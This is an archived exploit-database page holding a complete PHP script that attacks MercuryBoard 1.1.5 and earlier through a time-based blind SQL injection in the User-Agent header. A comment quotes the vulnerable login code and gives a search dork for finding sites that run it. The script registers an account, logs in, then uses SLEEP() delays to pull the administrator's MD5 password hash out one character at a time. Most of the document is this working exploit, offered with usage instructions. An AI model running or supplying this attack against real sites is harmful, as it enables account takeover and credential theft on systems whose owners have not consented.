<html><head><title>MercuryBoard <= 1.1.5 (login.php) Remote Blind SQL Injection Exploit</title></head><pre>&lt;?php

/*
	--------------------------------------------------------------------
	MercuryBoard &lt;= 1.1.5 (login.php) Remote Blind SQL Injection Exploit
	--------------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.mercuryboard.com/
	dork.....: &quot;Powered by MercuryBoard&quot;
	details..: SLEEP() function was added in MySQL 5.0.12, so this PoC works depending on the version of MySQL

	[-] do_login() function vulnerable to SQL injection in /func/login.php

	52.	function do_login()
	53.	{
	54.		$this-&gt;set_title($this-&gt;lang-&gt;login_header);
	55.		$this-&gt;tree($this-&gt;lang-&gt;login_header);
	56.		
	57.		//print &quot;agent: $this-&gt;agent\n&quot;;
	58.	
	59.		if (!isset($this-&gt;post['submit'])) {
	60.			$request_uri = $this-&gt;get_uri();
	61.	
	62.			if (substr($request_uri, -8) == 'register') {
	63.				$request_uri = $this-&gt;self;
	64.			}
	65.	
	66.			return eval($this-&gt;template('LOGIN_MAIN'));
	67.		} else {
	68.			$username = str_replace('\\', '&amp;#092;', $this-&gt;format(stripslashes($this-&gt;post['user']), FORMAT_HTMLCHARS | FORMAT_CENSOR));
	69.	
	70.			$data  = $this-&gt;db-&gt;fetch(&quot;SELECT user_id, user_password FROM {$this-&gt;pre}users WHERE REPLACE(LOWER(user_name), ' ', '')='&quot; . str_replace(' ', '', strtolower($username)) . '\' AND user_id != ' . USER_GUEST_UID . ' LIMIT 1');
	71.			$pass  = $data['user_password'];
	72.			$user  = $data['user_id'];
	73.	
	74.			$this-&gt;post['pass'] = str_replace('$', '', $this-&gt;post['pass']);
	75.			$this-&gt;post['pass'] = md5($this-&gt;post['pass']);
	76.	
	77.			if ($this-&gt;post['pass'] == $pass) {
	78.				if (!setcookie($this-&gt;sets['cookie_prefix'] . 'user', $user, $this-&gt;time + $this-&gt;sets['logintime'], $this-&gt;sets['cookie_path'])
	79.				||  !setcookie($this-&gt;sets['cookie_prefix'] . 'pass', $pass, $this-&gt;time + $this-&gt;sets['logintime'], $this-&gt;sets['cookie_path'])) {
	80.					return $this-&gt;message($this-&gt;lang-&gt;login_header, $this-&gt;lang-&gt;login_cookies);
	81.				}
	82.	
	83.				// Delete guest entry
	84.				$this-&gt;db-&gt;query(&quot;DELETE FROM {$this-&gt;pre}active WHERE active_ip='$this-&gt;ip' AND active_user_agent='$this-&gt;agent'&quot;); &lt;=======
	85.	
	86.				return $this-&gt;message($this-&gt;lang-&gt;login_header, $this-&gt;lang-&gt;login_logged, $this-&gt;lang-&gt;main_continue, str_replace('&amp;', '&amp;amp;', $this-&gt;post['request_uri']), $this-&gt;post['request_uri']);

	$this-&gt;agent (User-Agent header) isn't properly sanitised, so an attacker could be inject arbitrary SQL code in a subquery into the query at line 84
	
	[-] Possible bug fix in /global.php
	
	66.	function mercuryboard()
	67.	{
	68.		$this-&gt;time    = time();
	69.		$this-&gt;query   = isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : null;
	70.		$this-&gt;ip      = $_SERVER['REMOTE_ADDR'];
	71.		$this-&gt;agent   = isset($_SERVER['HTTP_USER_AGENT']) ? addslashes($_SERVER['HTTP_USER_AGENT']) : null; &lt;=======
	72.		$this-&gt;self    = $_SERVER['PHP_SELF'];
	73.		$this-&gt;server  = $_SERVER;
*/

error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print &quot;\n[-] No response from {$host}:80 Trying again...&quot;;
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

function getmicrotime()
{ 
	list($usec, $sec) = explode(&quot; &quot;, microtime()); 
	return ((float)$usec + (float)$sec); 
}

function getdelay($query)
{
	global $host, $path, $username, $password;
	
	$data	= &quot;user={$username}&amp;pass={$password}&amp;submit=1&amp;request_uri=foo&quot;;
	$packet = &quot;POST {$path}index.php?a=login HTTP/1.0\r\n&quot;;
	$packet.= &quot;Host: {$host}\r\n&quot;;
	$packet.= &quot;User-Agent: {$query}\r\n&quot;;
	$packet.= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
	$packet.= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$packet.= &quot;Connection: close\r\n\r\n&quot;;
	$packet.= $data;

	$start = getmicrotime()*1000;
	http_send($host, $packet);
	$end = getmicrotime()*1000;

	return ($end - $start);
}

function getusername($uid)
{
	global $host, $path;
	
	$packet = &quot;GET {$path}index.php?a=profile&amp;w={$uid} HTTP/1.0\r\n&quot;;
	$packet.= &quot;Host: {$host}\r\n&quot;;
	$packet.= &quot;Connection: close\r\n\r\n&quot;;
	preg_match(&quot;/Viewing Profile: (.*)&lt;\/td&gt;/i&quot;, http_send($host, $packet), $split);

	return $split[1];
}

function register()
{
	global $host, $path, $username, $password;
	
	$data	= &quot;desuser={$username}&amp;email=foo@null.com&amp;passA={$password}&amp;passB={$password}&amp;submit=1&quot;;
	$packet = &quot;POST {$path}index.php?a=register HTTP/1.0\r\n&quot;;
	$packet.= &quot;Host: {$host}\r\n&quot;;
	$packet.= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
	$packet.= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$packet.= &quot;Connection: close\r\n\r\n&quot;;
	$packet.= $data;
	
	http_send($host, $packet);
}

function login()
{
	global $host, $path, $username, $password;
	
	$data	= &quot;user={$username}&amp;pass={$password}&amp;submit=1&amp;request_uri=foo&quot;;
	$packet = &quot;POST {$path}index.php?a=login HTTP/1.0\r\n&quot;;
	$packet.= &quot;Host: {$host}\r\n&quot;;
	$packet.= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
	$packet.= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$packet.= &quot;Connection: close\r\n\r\n&quot;;
	$packet.= $data;
	
	$pattern = &quot;/pass=&quot;.md5($password).&quot;/&quot;;
	
	return preg_match($pattern, http_send($host, $packet));	
}

print &quot;\n+------------------------------------------------------------------+&quot;;
print &quot;\n| MercuryBoard &lt;= 1.1.5 Remote Blind SQL Injection Exploit by EgiX |&quot;;
print &quot;\n+------------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage......:	php $argv[0] host path [options]\n&quot;;
	print &quot;\nhost.......:	target server (ip/hostname)&quot;;
	print &quot;\npath.......:	path to MercuryBoard directory (example: / or /mercury/)\n&quot;;
	print &quot;\n-s seconds.:	number of seconds for SLEEP() (dafault: 5)&quot;;
	print &quot;\n-u uid.....:	user id (default: 2 - admin)&quot;;
	print &quot;\n-t prefix..:	table's prefix (default: mb)\n&quot;;
	print &quot;\nExample....:	php $argv[0] localhost /mercury/ -s 1&quot;;
	print &quot;\nExample....:	php $argv[0] localhost / -u 3 -t my_prefix\n&quot;;
	die();
}

$host	= $argv[1];
$path	= $argv[2];

$username = &quot;pr00f_0f&quot;;
$password = &quot;_c0nc3pt&quot;;

$opt	= array(&quot;-s&quot;, &quot;-u&quot;, &quot;-t&quot;);
$md5	= &quot;&quot;;
$count	= &quot;5&quot;;
$uid	= &quot;2&quot;;
$prefix = &quot;mb&quot;;

for ($i = 3; $i &lt; $argc; $i++)
{
	if ($argv[$i] == &quot;-s&quot;) if (isset($argv[$i+1]) &amp;&amp; !in_array($argv[$i+1], $opt)) $count = $argv[++$i];
	if ($argv[$i] == &quot;-u&quot;) if (isset($argv[$i+1]) &amp;&amp; !in_array($argv[$i+1], $opt)) $uid = $argv[++$i];
	if ($argv[$i] == &quot;-t&quot;) if (isset($argv[$i+1]) &amp;&amp; !in_array($argv[$i+1], $opt)) $prefix = $argv[++$i];	
}

if (!login())
{
	print &quot;\n[-] Trying to register with username '{$username}' and password '{$password}'\n&quot;;
	register();
	if (!login()) die(&quot;\n[-] Login failed!\n&quot;);
}

$user = getusername($uid);
print &quot;\n[-] Username: {$user}&quot;;

$hash = array(0,48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
$index = 1; $md5 = &quot;&quot;;
print &quot;\n[-] MD5 Hash: &quot;;
	
while (!strpos($md5, chr(0)))
{
	for ($i = 0, $n = count($hash); $i &lt;= $n; $i++)
	{
		if ($i == $n) die(&quot;\n\n[-] Exploit failed...\n&quot;);
		$sql = &quot;'OR(SELECT IF(ORD(SUBSTR(user_password,{$index},1))={$hash[$i]},SLEEP({$count}),1) FROM {$prefix}_users WHERE user_id={$uid})#&quot;;
		if (getdelay($sql) &gt;= ($count * 1000)) { $md5 .= chr($hash[$i]); print chr($hash[$i]); break; }
	}
	
	$index++;
}

if (!eregi(&quot;[0-9,a-f]{32}&quot;, $md5)) print &quot;\n\n[-] Invalid MD5 hash...\n&quot;;
else print &quot;\n\n[-] Successfull!\n&quot;;
	
?&gt;

# milw0rm.com [2008-05-19]</pre></html>